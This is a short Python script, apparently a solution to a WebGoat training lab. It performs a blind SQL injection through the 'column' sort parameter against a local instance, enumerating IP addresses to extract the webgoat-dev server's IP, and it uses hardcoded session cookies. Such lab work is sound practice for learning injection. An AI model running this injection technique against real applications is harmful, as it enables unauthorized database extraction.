import requests
import json


result=''
url='http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when (select ip from servers where hostname=\'webgoat-dev\')=\'192.168.4.0\' then id else ip end)'
cookies={
    'JSESSIONID':'055AFCAD51F7E0F0E71F049E0CE56DBE',
    '__utma':'111872281.709274838.1511010954.1512367990.1512478478.6',
    'WEBWOLFSESSION':'45BA0871A3DFF623110F5987A4F59F6A'
}
for i in range(0,10):
    for j in range(0,10):
        ip='192.168.'+str(i)+'.'+str(j)
        #print(ip)
        urll='http://localhost:8080/WebGoat/SqlInjection/servers?column=(case when (select ip from servers where hostname=\'webgoat-dev\')=\''+ip+'\' then id else ip end)'
        r=requests.get(url=urll,cookies=cookies)
        #print(r.content)
        all=json.loads(r.content)
        if(all[0]["id"]=="1"):
            print(ip)